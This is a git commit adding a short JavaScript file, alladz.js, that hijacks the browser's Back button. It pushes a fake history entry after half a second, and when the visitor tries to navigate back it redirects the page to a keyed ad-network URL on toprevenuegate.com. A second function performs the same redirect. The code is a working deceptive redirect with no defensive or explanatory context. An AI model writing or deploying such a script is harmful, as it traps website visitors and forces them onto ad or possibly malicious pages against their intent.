b4ec751e339ed63da1e160a0c7707e36a670137c
online012 <139100753+online012@users.noreply.github.com>
2023-12-13 22:54:08 +0100

    Add files via upload

---
+++ alladz.js
@@ -0,0 +1,12 @@
+
+    window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="https://www.toprevenuegate.com/nwidv08vk1?key=67364249630931b546a2b97f18ec33c8";
+    }
+    function goon(){
+        location.href="https://www.toprevenuegate.com/nwidv08vk1?key=67364249630931b546a2b97f18ec33c8";
+    }
